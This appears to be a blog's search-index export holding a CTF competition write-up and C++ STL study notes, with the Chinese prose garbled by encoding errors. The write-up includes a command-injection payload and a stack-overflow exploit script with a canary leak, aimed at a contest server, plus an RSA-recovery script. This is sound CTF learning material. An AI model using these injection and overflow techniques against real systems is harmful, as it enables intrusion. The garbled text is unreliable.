<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DASCTF X CBCTF 2023 WP</title>
    <url>/posts/ec1aa757/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DASCTF-X-CBCTF-2023-WP"><a href="#DASCTF-X-CBCTF-2023-WP" class="headerlink" title="DASCTF X CBCTF 2023 WP"></a>DASCTF X CBCTF 2023 WP</h1><p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310221106000.png" alt="image-20231022110621972"></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="EASYBOX"><a href="#EASYBOX" class="headerlink" title="EASYBOX"></a>EASYBOX</h2><p>è¿™é¢˜ä¸€å¼€å§‹é€šè¿‡CATå‡½æ•°è¯»å‡ºcanary.txtï¼Œç„¶åæ‰¾æº¢å‡ºç‚¹æ‰¾äº†ä¸¤å°æ—¶ğŸ˜…</p>
<p>æœ€åå‘ç°ç›´æ¥å°±æ˜¯ä¸ªwebé¢˜ï¼Œåœ¨PINGå‡½æ•°é‡Œé¢æ‰§è¡Œsystemå‡½æ•°å‘½ä»¤</p>
<span id="more"></span>

<blockquote>
<p>;tac flaâ€™â€™g;</p>
</blockquote>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310272057437.png" alt="image-20231021182601723"></p>
<h2 id="GuestBook"><a href="#GuestBook" class="headerlink" title="GuestBook"></a>GuestBook</h2><p>è¾“å…¥nameçš„æ—¶å€™æœ‰æº¢å‡ºï¼Œå¯ä»¥è¦†ç›–ä¸€ä¸ªå­—èŠ‚æ³„éœ²canaryï¼Œ</p>
<p>æ¥ç€åœ¨strcpyä¸­æœ‰æº¢å‡ºï¼Œç›´æ¥ä¼ payloadï¼Œè¢«strcpyé‡bâ€™\x00â€™æˆªæ–­è¿™ä¸ªé—®é¢˜å¡ä½äº†ï¼ˆé‡é›¶æˆªæ–­æ„å‘³ç€æ— æ³•ä¼ è¾“å­—ç¬¦\x00ï¼Œç„¶è€Œcanaryä»¥\x00ç»“å°¾ï¼‰</p>
<p>è°ƒè¯•è§£å†³å‘ç°åœ¨  __isoc99_scanf(â€œ%sâ€, message);è¾“å…¥å­—ç¬¦ä¸²çš„æ—¶å€™ä¼šåœ¨åé¢è¡¥é›¶</p>
<p>äºæ˜¯å¯ä»¥é€šè¿‡å¤šæ¬¡è¾“å…¥å…ˆè¾“å…¥è¦†ç›–è¿”å›åœ°å€å’Œcanaryé™¤å»\x00çš„ä¸ƒä¸ªå­—ç¬¦ï¼Œå†ç»™canaryè¡¥ä¸Š\x00</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Excalibur <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">contextset()</span><br><span class="line"></span><br><span class="line">remo(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28227</span>)</span><br><span class="line"><span class="comment">#proc(&#x27;./GuestBook&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *0x000000000040143C&#x27;)</span></span><br><span class="line">sla(<span class="string">b&#x27;name:&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x17</span>)+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">t1 = ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">pr(t1)</span><br><span class="line">canary0 = ru(<span class="string">b&#x27;How&#x27;</span>)[:-<span class="number">7</span>]</span><br><span class="line">canary = (u64(<span class="string">b&#x27;\x00&#x27;</span>+canary0))</span><br><span class="line">prh(canary)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x00000000004012C3</span></span><br><span class="line">sla(<span class="string">b&#x27;):&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sl(cyclic(<span class="number">0x98</span>)+<span class="string">b&#x27;a&#x27;</span>+canary0+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(system))</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pr(<span class="built_in">type</span>(canary))</span><br><span class="line">pay = cyclic(<span class="number">0x38</span>)<span class="comment">#+p64(canary)+b&#x27;a&#x27;*8+p64(system)</span></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310211839964.png" alt="image-20231021183919918"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>æƒ³æ¢å¤p,å…³é”®åœ¨äºäºŒæ¬¡å‰©ä½™</p>
<p>åŠ å¯†æ˜¯ä¸€ä¸ªæ¯”ç‰¹ä¸€ä¸ªæ¯”ç‰¹åœ°åŠ å¯†,æ¢å¤æ—¶åˆ¤æ–­æ˜¯å¦ä¸ºäºŒæ¬¡å‰©ä½™å³å¯æ¢å¤</p>
<p>å¯¹äºqå°±æ›´ç®€å•,ç›´æ¥æ±‚å¤šé¡¹å¼çš„gcdå³å¯</p>
<p>ä»£ç å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">124349762993424531697403299350944207725577290992189948388824124986066269514204313888980321088629462472088631052329128042837153718129149149661961926557818023704330462282009415874674794190206220980118413541269327644472633791532767765585035518183177197863522573410860341245613331398610013697803459403446614221369</span></span><br><span class="line"></span><br><span class="line">(e1, noise1, c1) = (<span class="number">1743</span>, <span class="number">44560588075773853612820227436439937514195680734214431948441190347878274184937952381785302837541202705212687700521129385632776241537669208088777729355349833215443048466316517110778502508209433792603420158786772339233397583637570006255153020675167597396958251208681121668808253767520416175569161674463861719776</span>, <span class="number">65643009354198075182587766550521107063140340983433852821580802983736094225036497335607400197479623208915379722646955329855681601551282788854644359967909570360251550766970054185510197999091645907461580987639650262519866292285164258262387411847857812391136042309550813795587776534035784065962779853621152905983</span>)</span><br><span class="line">(e2, noise2, c2) = (<span class="number">1325</span>, <span class="number">35282006599813744140721262875292395887558561517759721467291789696459426702600397172655624765281531167221787036009507833425145071265739486735993631460189629709591456017092661028839951392247601628468621576100035700437892164435424035004463142959219067199451575338270613300215815894328788753564798153516122567683</span>, <span class="number">50327632090778183759544755226710110702046850880299488259739672542025916422119065179822210884622225945376465802069464782311211031263046593145733701591371950349735709553105217501410716570601397725812709771348772095131473415552527749452347866778401205442409443726952960806789526845194216490544108773715759733714</span>)</span><br><span class="line">n2 = <span class="number">103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902098180199167945649526235613636163362672777298968943319216325949503045377100235181706964846408396946496139224344270391027205106691880999410424150216806861393</span></span><br><span class="line">n1 = <span class="number">65634094430927080732256164808833233563732628654160389042977689628512527168256899310662239009610512772020503283842588142453533499954947692968978190310627721338357432052800695091789711809256924541784954080619073213358228083200846540676931341013554634493581962527475555869292091755676130810562421465063412235309</span></span><br><span class="line">str0=<span class="string">&#x27;&#x27;</span><span class="comment">#wpè£…ä¸ä¸‹è¿™ä¹ˆé•¿çš„å­—ç¬¦</span></span><br><span class="line"><span class="comment">#legendre_symbol(i,p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> GCD(b, a % b)</span><br><span class="line"></span><br><span class="line">F.&lt;x&gt;=PolynomialRing(Zmod(n2))</span><br><span class="line">f1=(x+noise1)^e1-c1</span><br><span class="line">f2=(x+noise2)^e2-c2</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(GCD(f1,f2))</span></span><br><span class="line"></span><br><span class="line">q=n2-<span class="number">103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902084990861262304328268863425199809518254496553684067856859306280794877830073274539837451563189724268783548897996668966918676147376205691514341926655798880936</span></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="built_in">print</span>(q.nbits())</span><br><span class="line"></span><br><span class="line">strlist=str0.split(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"><span class="comment">#print(strlist)</span></span><br><span class="line">intlist=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> strlist[:-<span class="number">1</span>]]</span><br><span class="line"><span class="comment">#print(intlist)</span></span><br><span class="line">p=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> intlist:</span><br><span class="line">    <span class="comment">#print(&#x27;test&#x27;+p)</span></span><br><span class="line">    <span class="keyword">if</span> jacobi(i,n1)==<span class="number">1</span>:</span><br><span class="line">        p=<span class="string">&#x27;1&#x27;</span>+p</span><br><span class="line">        <span class="comment">#print(p)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=<span class="string">&#x27;0&#x27;</span>+p</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(p,base=<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p=<span class="built_in">int</span>(p,base=<span class="number">2</span>)      </span><br><span class="line"><span class="built_in">print</span>(is_prime(p))</span><br><span class="line"><span class="built_in">print</span>(ZZ(p).nbits())</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse_mod(<span class="number">65537</span>,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br></pre></td></tr></table></figure>

<h2 id="CB-backpack"><a href="#CB-backpack" class="headerlink" title="CB backpack"></a>CB backpack</h2><p>ç”±äºè¿ç»­å…­ä¸ª01ä¸²ä¸­æœ‰3ä¸ª1ï¼Œåœ¨åŸå§‹èƒŒåŒ…æ ¼çš„åŸºç¡€ä¸Šæ¯è¿ç»­å…­åˆ—æ–°å¢ä¸€åˆ—ï¼Œé™åˆ¶è¿™ä¸ªæ¡ä»¶ï¼Œæœ€ç»ˆLLLå³å¯è¿˜åŸ</p>
<p><del>è„šæœ¬ä¸¢äº†XD</del></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>C++STL å­¦ä¹ ç¬”è®°</title>
    <url>/posts/45592537/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="C-STL-å­¦ä¹ ç¬”è®°"><a href="#C-STL-å­¦ä¹ ç¬”è®°" class="headerlink" title="C++STL å­¦ä¹ ç¬”è®°"></a>C++STL å­¦ä¹ ç¬”è®°</h1><span id="more"></span>

<h2 id="STLè¡¥å……"><a href="#STLè¡¥å……" class="headerlink" title="STLè¡¥å……"></a>STLè¡¥å……</h2><h3 id="List-é“¾è¡¨"><a href="#List-é“¾è¡¨" class="headerlink" title="List  é“¾è¡¨"></a>List  é“¾è¡¨</h3><ul>
<li><p><code> list&lt;int&gt; mylist = &#123; &#125;</code>é“¾è¡¨å®šä¹‰å’Œåˆå§‹åŒ–</p>
</li>
<li><p><code>void push_front(const T &amp; val) </code> å°† val æ’å…¥é“¾è¡¨æœ€å‰é¢ </p>
</li>
<li><p><code>void pop_front()  </code> åˆ é™¤é“¾è¡¨æœ€å‰é¢çš„å…ƒç´  </p>
</li>
<li><p><code>list.push_back()</code> å¢åŠ ä¸€ä¸ªæ–°çš„å…ƒç´ åœ¨ list çš„å°¾ç«¯ </p>
</li>
<li><p><code>list.pop_back()</code> åˆ é™¤ list çš„æœ€æœ«ä¸ªå…ƒç´  </p>
</li>
<li><p><code>void sort() </code>  å°†é“¾è¡¨ä»å°åˆ°å¤§æ’åº </p>
</li>
<li><p><code>reverse()</code>åè½¬é“¾è¡¨</p>
</li>
<li><p><code>list.empty()</code> è‹¥listå†…éƒ¨ä¸ºç©ºï¼Œåˆ™å›ä¼ trueå€¼ </p>
</li>
<li><p><code>list.size()</code> å›ä¼ listå†…å®é™…çš„å…ƒç´ ä¸ªæ•° </p>
</li>
<li><p><code>list.front()</code> å­˜å–ç¬¬ä¸€ä¸ªå…ƒç´  </p>
</li>
<li><p><code>list.back()</code> å­˜å–æœ€æœ«ä¸ªå…ƒç´  </p>
</li>
<li><p><code>mylist.begin()</code> é¦–ä½è¿­ä»£å™¨</p>
</li>
<li><p><code>mylist.end()</code>æœ«ä½è¿­ä»£å™¨</p>
</li>
<li><p>å¸¸è§forå¾ªç¯</p>
<ul>
<li><p><code>for (auto it = mylist.begin(); it != mylist.end(); ++it)  </code></p>
<pre><code>                  `cout &lt;&lt; *it &lt;&lt; &quot; &quot;;` 
</code></pre>
</li>
<li><p>itæ˜¯è¿­ä»£å™¨æŒ‡é’ˆï¼Œä¸èƒ½èµ‹å€¼ï¼Œä¸èƒ½è¿ç®—ï¼ˆ+&#x3D;ä¸è¡Œï¼‰ï¼Œåªèƒ½++</p>
</li>
<li><p>listçš„è¿­ä»£å™¨åªæ”¯æŒåŒå‘è®¿é—®ï¼Œä¸æ”¯æŒéšæœºè®¿é—®ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥è¿›è¡ŒåŠ å‡æ“ä½œ ï¼ˆå’Œvectorç­‰åŒºåˆ«ï¼‰</p>
</li>
</ul>
</li>
<li><p><code>advance(it, n); </code>å°†è¿­ä»£å™¨<code>it</code>å‘å‰ç§»åŠ¨nä¸ªä½ç½® </p>
</li>
<li><p><code>mylist.insert(it, k);</code>  å‘ç¬¬itä½è¿­ä»£å™¨ä½ç½®æ’å…¥æ–°å…ƒç´ kï¼ˆitä¹‹å‰ï¼‰</p>
</li>
<li><p><code>mylist.erase(it);</code> åˆ é™¤ç¬¬itä½è¿­ä»£å™¨ä½ç½®æ‰€æŒ‡å…ƒç´ </p>
</li>
<li><p><code>mylist.erase(it, it + n); </code>åˆ é™¤ç¬¬itä½åˆ°ç¬¬it+nä½å…ƒç´ ï¼ˆä¸€å…±åˆ é™¤ä»itå¼€å§‹åˆ°it+nçš„nä¸ªå…ƒç´ ï¼‰</p>
</li>
<li><p><code>next(it,n)</code>å‡½æ•°æ˜¯C++ STLä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯è¿”å›ä¸€ä¸ªæ–°çš„è¿­ä»£å™¨ï¼Œè¯¥è¿­ä»£å™¨æŒ‡å‘åŸå§‹è¿­ä»£å™¨å‘å‰æˆ–å‘åç§»åŠ¨æŒ‡å®šè·ç¦»åçš„ä½ç½® ï¼Œè¢«ç”¨æ¥ç§»åŠ¨itè¿­ä»£å™¨åˆ°ä¸‹nä½</p>
</li>
</ul>
<h3 id="vector-å­˜æ”¾ä»»æ„ç±»å‹çš„åŠ¨æ€æ•°ç»„"><a href="#vector-å­˜æ”¾ä»»æ„ç±»å‹çš„åŠ¨æ€æ•°ç»„" class="headerlink" title="vector  å­˜æ”¾ä»»æ„ç±»å‹çš„åŠ¨æ€æ•°ç»„"></a>vector  å­˜æ”¾ä»»æ„ç±»å‹çš„åŠ¨æ€æ•°ç»„</h3><ul>
<li><code>vector&lt;T&gt;(nSize,t)</code>åˆ›å»ºä¸€ä¸ªvectorï¼Œå…ƒç´ ä¸ªæ•°ä¸ºnSize,ä¸”å€¼å‡ä¸ºt</li>
<li><code>vector.push_back(k)</code> åœ¨vectorå°¾éƒ¨æ’å…¥å…ƒç´ k</li>
<li><code>vector.insert(vector.begin() + 1, 2) </code> åœ¨vectorçš„ç¬¬2ä¸ªä½ç½®æ’å…¥ä¸€ä¸ªå…ƒç´ 2 </li>
<li><code>vector.pop_back() </code> åˆ é™¤vectorå°¾éƒ¨çš„ä¸€ä¸ªå…ƒç´  </li>
<li><code>vector.erase(v.begin() + 1) </code>åˆ é™¤vectorçš„ç¬¬2ä¸ªå…ƒç´  </li>
<li><code>erase()</code>æ–¹æ³•æ¥å—ä¸¤ä¸ªè¿­ä»£å™¨å‚æ•°ï¼Œè¡¨ç¤ºè¦åˆ é™¤çš„åŒºé—´çš„èµ·å§‹ä½ç½®å’Œç»“æŸä½ç½®ã€‚è¢«åˆ é™¤çš„åŒºé—´åŒ…æ‹¬èµ·å§‹ä½ç½®çš„å…ƒç´ ï¼Œä½†ä¸åŒ…æ‹¬ç»“æŸä½ç½®çš„å…ƒç´ ã€‚ </li>
<li><code>vector.[0];</code> è®¿é—®vectorçš„ç¬¬1ä¸ªå…ƒç´  ï¼Œ å¯è¿›è¡Œèµ‹å€¼ç­‰æ“ä½œ</li>
<li><code>vector.at(0); </code>&#x2F;è®¿é—®vectorçš„ç¬¬1ä¸ªå…ƒç´ ï¼Œå¦‚æœè¶Šç•Œä¼šæŠ›å‡ºå¼‚å¸¸ </li>
<li><code>for (int i = 0; i &lt; v.size(); i++) &#123; cout &lt;&lt; v[i] &lt;&lt; &quot; &quot;; &#125; </code> éå†vector</li>
<li><code>vector.resize()</code> æ”¹å˜å®é™…å…ƒç´ çš„ä¸ªæ•°ï¼Œæ–°æ·»åŠ çš„å…ƒç´ ä¼šè¢«é»˜è®¤åˆå§‹åŒ– </li>
<li><code>vector.size() </code>è·å–vectorçš„å¤§å° ï¼Œè¿™æ˜¯å½“å‰å­˜å‚¨çš„å…ƒç´ æ•°é‡</li>
<li><code>vector.capacity()</code>è¿”å›å½“å‰å®¹é‡ï¼Œè¿™æ˜¯ç›®å‰å®¹å™¨æœ€å¤šå‚¨å­˜çš„å…ƒç´ æ•°é‡</li>
<li><code>vector.front() </code>è¿”å›ç¬¬ä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ </li>
<li><code>vector.back()</code>è¿”å›æœ€åä¸€ä¸ªå…ƒç´ çš„å¼•ç”¨ </li>
<li><code>vector.begin()</code>è¿”å›æŒ‡å‘å®¹å™¨ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ çš„è¿­ä»£å™¨ </li>
<li><code>vector.end()</code>è¿”å›æŒ‡å‘å®¹å™¨æœ€åä¸€ä¸ªå…ƒç´ æ‰€åœ¨ä½ç½®åä¸€ä¸ªä½ç½®çš„è¿­ä»£å™¨ï¼Œé€šå¸¸å’Œ begin() ç»“åˆä½¿ç”¨</li>
<li><code>vector.empty()</code>åˆ¤æ–­ä¸€ä¸ªvectoræ˜¯å¦ä¸ºç©º</li>
</ul>
<h2 id="STLå®¹å™¨é€‚é…å™¨"><a href="#STLå®¹å™¨é€‚é…å™¨" class="headerlink" title="STLå®¹å™¨é€‚é…å™¨"></a>STLå®¹å™¨é€‚é…å™¨</h2><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><ul>
<li><code>stack&lt;T&gt;</code> åˆ›å»ºæ ˆå¯¹è±¡</li>
<li><code>push(element)</code>ï¼šå°†å…ƒç´ å‹å…¥æ ˆé¡¶</li>
<li><code>pop()</code>ï¼šå¼¹å‡ºæ ˆé¡¶å…ƒç´ </li>
<li><code>top()</code>ï¼šè¿”å›æ ˆé¡¶å…ƒç´ </li>
<li><code>empty()</code>ï¼šè¿”å›æ ˆæ˜¯å¦ä¸ºç©º</li>
<li><code>size()</code>ï¼šè¿”å›æ ˆä¸­å…ƒç´ çš„æ•°é‡</li>
</ul>
<blockquote>
<p>æ¸…ç©ºæ ˆæ“ä½œï¼š <code>while (!myStack.empty()) &#123; myStack.pop(); &#125; </code></p>
</blockquote>
<h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><ul>
<li><code>queue &lt;int&gt; </code> åˆ›å»ºqueueå¯¹è±¡</li>
<li><code>push(element)</code>ï¼šå°†å…ƒç´ æ·»åŠ åˆ°é˜Ÿåˆ—çš„æœ«å°¾</li>
<li><code>pop()</code>ï¼šä»é˜Ÿåˆ—çš„å¤´éƒ¨å–å‡ºå…ƒç´ ï¼Œå¹¶å°†å…¶ä»é˜Ÿåˆ—ä¸­åˆ é™¤</li>
<li><code>front()</code>ï¼šè¿”å›é˜Ÿåˆ—å¤´éƒ¨çš„å…ƒç´ ï¼Œä½†ä¸å°†å…¶ä»é˜Ÿåˆ—ä¸­åˆ é™¤</li>
<li><code>back()</code>ï¼šè¿”å›é˜Ÿåˆ—æœ«å°¾çš„å…ƒç´ ï¼Œä½†ä¸å°†å…¶ä»é˜Ÿåˆ—ä¸­åˆ é™¤</li>
<li><code>size()</code>ï¼šè¿”å›é˜Ÿåˆ—ä¸­å…ƒç´ çš„æ•°é‡</li>
<li><code>empty()</code>ï¼šåˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º</li>
</ul>
<h3 id="priority-queue"><a href="#priority-queue" class="headerlink" title="priority_queue"></a>priority_queue</h3><ul>
<li><p><code>push(element)</code>ï¼šå°†å…ƒç´ æ·»åŠ åˆ°ä¼˜å…ˆé˜Ÿåˆ—ä¸­ï¼Œæ ¹æ®ä¼˜å…ˆçº§é¡ºåºæ’åˆ—ã€‚</p>
</li>
<li><p><code>pop()</code>ï¼šä»ä¼˜å…ˆé˜Ÿåˆ—ä¸­å–å‡ºä¼˜å…ˆçº§æœ€é«˜çš„å…ƒç´ ï¼Œå¹¶å°†å…¶ä»é˜Ÿåˆ—ä¸­åˆ é™¤ã€‚</p>
</li>
<li><p><code>top()</code>ï¼šè¿”å›ä¼˜å…ˆé˜Ÿåˆ—ä¸­ä¼˜å…ˆçº§æœ€é«˜çš„å…ƒç´ ï¼Œä½†ä¸å°†å…¶ä»é˜Ÿåˆ—ä¸­åˆ é™¤ã€‚</p>
</li>
<li><p><code>size()</code>ï¼šè¿”å›ä¼˜å…ˆé˜Ÿåˆ—ä¸­å…ƒç´ çš„æ•°é‡ã€‚</p>
</li>
<li><p><code>empty()</code>ï¼šåˆ¤æ–­ä¼˜å…ˆé˜Ÿåˆ—æ˜¯å¦ä¸ºç©º</p>
</li>
<li><p><code>priority_queue&lt;int, std::vector&lt;int&gt;, std::less&lt;int&gt;&gt; myMaxHeap;</code>åˆ›å»ºå¤§é¡¶å †</p>
</li>
<li><p><code>less&lt;int&gt;</code>æ˜¯<code>priority_queue</code>çš„é»˜è®¤æ¯”è¾ƒå‡½æ•°ï¼Œå› æ­¤åœ¨åˆ›å»ºå¤§é¡¶å †æ—¶å¯ä»¥çœç•¥ç¬¬ä¸‰ä¸ªå‚æ•°ã€‚ä»¥ä¸‹æ˜¯æ›´ç®€æ´çš„è¡¨è¾¾å¼ï¼š<code>priority_queue&lt;int&gt; myMaxHeap;</code></p>
</li>
<li><p><code>priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; myMinHeap; </code> åˆ›å»ºå°é¡¶å †</p>
</li>
</ul>
<blockquote>
<p><code>priority_queue&lt;int, vector&lt;int&gt;,greater&lt;int&gt;&gt;</code> æŒ‡å®šäº†ä½¿ç”¨<code>greater&lt;int&gt;</code> ä½œä¸ºæ¯”è¾ƒå‡½æ•°ï¼Œå› æ­¤åˆ›å»ºçš„ä¼˜å…ˆé˜Ÿåˆ—æ˜¯å‡åºçš„ï¼Œå³ä¼˜å…ˆçº§æ•°å€¼å°çš„å…ƒç´ æ’åœ¨é˜Ÿåˆ—å‰é¢ã€‚å¦‚æœæƒ³è¦åˆ›å»ºé™åºçš„ä¼˜å…ˆé˜Ÿåˆ—ï¼Œå¯ä»¥ä½¿ç”¨ <code>less&lt;int&gt;</code> ä½œä¸ºæ¯”è¾ƒå‡½æ•°ï¼Œä¾‹å¦‚ <code>priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt;&gt;</code>  </p>
</blockquote>
<p>EG: ä¼˜å…ˆé˜Ÿåˆ—å®ç°æ»‘åŠ¨çª—å£æ±‚æœ€å¤§å€¼</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> k; <span class="comment">// æ»‘åŠ¨çª—å£å¤§å°</span></span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; k;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">nums</span><span class="params">(n)</span></span>; <span class="comment">// è¾“å…¥æ•°ç»„</span></span><br><span class="line">    priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; pq; <span class="comment">// å®šä¹‰ä¼˜å…ˆé˜Ÿåˆ—ï¼Œå­˜æ”¾æ•°å€¼å’Œä¸‹æ ‡</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++)</span><br><span class="line">        cin &gt;&gt; nums[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…ˆå°†å‰ k ä¸ªå…ƒç´ åŠ å…¥ä¼˜å…ˆé˜Ÿåˆ—</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">        pq.<span class="built_in">push</span>(&#123; nums[i], i &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡ºç¬¬ä¸€ä¸ªæ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼</span></span><br><span class="line">    cout &lt;&lt; pq.<span class="built_in">top</span>().first &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ»‘åŠ¨çª—å£å‘å³ç§»åŠ¨ï¼Œæ¯æ¬¡åŠ å…¥ä¸€ä¸ªæ–°å…ƒç´ ï¼Œå¼¹å‡ºä¸€ä¸ªæ—§å…ƒç´ </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = k; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        pq.<span class="built_in">push</span>(&#123; nums[i], i &#125;); <span class="comment">// åŠ å…¥æ–°å…ƒç´ </span></span><br><span class="line">        <span class="keyword">while</span> (pq.<span class="built_in">top</span>().second &lt;= i - k) &#123; <span class="comment">// å¼¹å‡ºæ—§å…ƒç´ </span></span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; pq.<span class="built_in">top</span>().first &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// è¾“å‡ºå½“å‰æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h3><ul>
<li><code>push_back(element)</code>ï¼šåœ¨é˜Ÿå°¾æ’å…¥ä¸€ä¸ªå…ƒç´ ã€‚</li>
<li><code>pop_back()</code>ï¼šåˆ é™¤é˜Ÿå°¾å…ƒç´ ã€‚</li>
<li><code>push_front(element)</code>ï¼šåœ¨é˜Ÿå¤´æ’å…¥ä¸€ä¸ªå…ƒç´ ã€‚</li>
<li><code>pop_front()</code>ï¼šåˆ é™¤é˜Ÿå¤´å…ƒç´ ã€‚</li>
<li><code>front()</code>ï¼šè¿”å›é˜Ÿå¤´å…ƒç´ ï¼Œä½†ä¸åˆ é™¤ã€‚</li>
<li><code>back()</code>ï¼šè¿”å›é˜Ÿå°¾å…ƒç´ ï¼Œä½†ä¸åˆ é™¤ã€‚</li>
<li><code>empty()</code>ï¼šå¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œè¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚</li>
<li><code>size()</code>ï¼šè¿”å›é˜Ÿåˆ—ä¸­å…ƒç´ çš„ä¸ªæ•°ã€‚</li>
</ul>
<h3 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h3><ul>
<li><code>make_heap(first, last)</code>ï¼šå°†[first, last)åŒºé—´å†…çš„å…ƒç´ è½¬æ¢ä¸ºå †ã€‚</li>
<li><code>push_heap(first, last)</code>ï¼šå°†[first, last-1)åŒºé—´å†…çš„å…ƒç´ æ’å…¥å †ä¸­ã€‚</li>
<li><code>pop_heap(first, last)</code>ï¼šå°†å †é¡¶å…ƒç´ ç§»åŠ¨åˆ°[last-1]ä½ç½®ï¼Œå¹¶é‡æ–°æ„å»ºå †ã€‚</li>
<li><code>sort_heap(first, last)</code>ï¼šå°†[first, last)åŒºé—´å†…çš„å…ƒç´ æ’åºï¼Œä½¿å…¶æ»¡è¶³å †çš„æ€§è´¨ã€‚</li>
